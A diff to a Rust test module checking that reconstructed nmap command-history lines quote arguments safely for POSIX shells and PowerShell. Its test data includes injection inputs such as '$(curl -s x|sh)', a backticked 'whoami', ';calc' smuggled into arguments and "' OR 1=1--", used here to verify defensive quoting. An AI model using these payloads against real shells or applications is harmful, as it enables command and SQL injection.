@@ -872,26 +872,33 @@ mod history_tests {
     /// an argument can end a quote or start another command, in POSIX shells or PowerShell.
     #[test]
     fn history_lines_paste_back_as_the_same_words() {
-        let cases: Vec<Vec<&str>> = vec![
+        let mut cases: Vec<Vec<&str>> = vec![
             vec!["-u", "https://app.example.com/a;calc"],
             vec!["-H", "X: $(curl -s x|sh)", "--data", "`whoami`"],
             vec!["x\u{2019};calc;\u{2019}", "it's", "\u{2018}\u{201A}\u{201B}"],
             vec!["-p", "80,443", "@splat", "--%", "~root", "a*b?[c]", "#c", "{x}", "a&b|c", "<in", ">out"],
             vec!["", "two words", "C:\\Program Files\\x.txt", "naïve", "例え"],
         ];
+        // Mission 8: words with a quote and nothing else special in double quotes
+        cases.push(vec!["it's", "' OR 1=1--", "O\u{2019}Brien & co", "a'b;c|d", "'"]);
+        // ... and words that keep the joined form: a quote together with $ ` " \ or !
+        cases.push(vec!["it's $HOME", "'`x`'", "say \"it's\"", "C:\\it's", "it's!", "\u{201C}it's\u{201D}"]);
+        let single = |c: char| matches!(c, '\'' | '\u{2018}' | '\u{2019}' | '\u{201A}' | '\u{201B}');
+        let special = |c: char| matches!(c, '$' | '`' | '"' | '\\' | '!' | '\u{201C}' | '\u{201D}' | '\u{201E}');
         for args in cases {
             let args: Vec<String> = args.into_iter().map(String::from).collect();
             let line = history_line("nmap", &args);
             let words = posix_words(&line).unwrap_or_else(|| panic!("unclosed quote: {line}"));
             assert_eq!(words[0], "nmap");
             assert_eq!(&words[1..], &args[..], "{line}");
-            // PowerShell: outside single-quoted text, only plain words, spaces and the `"q"` joins
+            // PowerShell: outside quoted text, only plain words, spaces, the `"q"` joins and whole
+            // words in double quotes with nothing special inside, which PowerShell reads exactly
             let mut quoted = false;
             let mut rest = line.as_str();
             while let Some(c) = rest.chars().next() {
                 rest = &rest[c.len_utf8()..];
                 if quoted {
-                    if matches!(c, '\'' | '\u{2018}' | '\u{2019}' | '\u{201A}' | '\u{201B}') {
+                    if single(c) {
                         assert_eq!(c, '\'', "a typographic quote ends PowerShell's quoted text: {line}");
                         quoted = false;
                     }
@@ -899,16 +906,33 @@ mod history_tests {
                     quoted = true;
                 } else if c == '"' {
                     let q = rest.chars().next().unwrap();
-                    assert!(matches!(q, '\'' | '\u{2018}' | '\u{2019}' | '\u{201A}' | '\u{201B}') && rest[q.len_utf8()..].starts_with('"'), "{line}");
-                    rest = &rest[q.len_utf8() + 1..];
+                    if single(q) && rest[q.len_utf8()..].starts_with('"') {
+                        rest = &rest[q.len_utf8() + 1..];
+                        continue;
+                    }
+                    let end = rest.find('"').unwrap_or_else(|| panic!("unclosed double quote: {line}"));
+                    let inner = &rest[..end];
+                    assert!(!inner.chars().any(special), "nothing in a double-quoted word is special to PowerShell or a POSIX shell: {line}");
+                    assert!(args.iter().any(|a| a == inner), "a double-quoted word is exactly an argument: {line}");
+                    rest = &rest[end + 1..];
+                    assert!(rest.is_empty() || rest.starts_with(' '), "a double-quoted word stands alone: {line}");
                 } else {
                     assert!(c == ' ' || c.is_ascii_alphanumeric() || "_+=:./-".contains(c), "{c:?} outside quotes: {line}");
                 }
             }
             assert!(!quoted, "{line}");
+            // the joined form, which PowerShell splits, is left only for a quote with a special character
+            for a in &args {
+                let w = crate::util::shell_word(a);
+                if a.chars().any(single) && w.starts_with('\'') {
+                    assert!(a.chars().any(special), "{a:?} could be written exactly for PowerShell too: {w}");
+                }
+            }
         }
         assert_eq!(history_line("nmap", &["-sV".into(), "10.0.0.1".into()]), "nmap -sV 10.0.0.1");
-        assert_eq!(crate::util::shell_word("x\u{2019};calc"), "'x'\"\u{2019}\"';calc'");
+        assert_eq!(crate::util::shell_word("x\u{2019};calc"), "\"x\u{2019};calc\"");
+        assert_eq!(crate::util::shell_word("it's $HOME"), "'it'\"'\"'s $HOME'");
+        assert_eq!(crate::util::shell_word("' OR 1=1--"), "\"' OR 1=1--\"");
     }
 
     /// Mission 7: arguments that could disguise the command in the native confirmation are
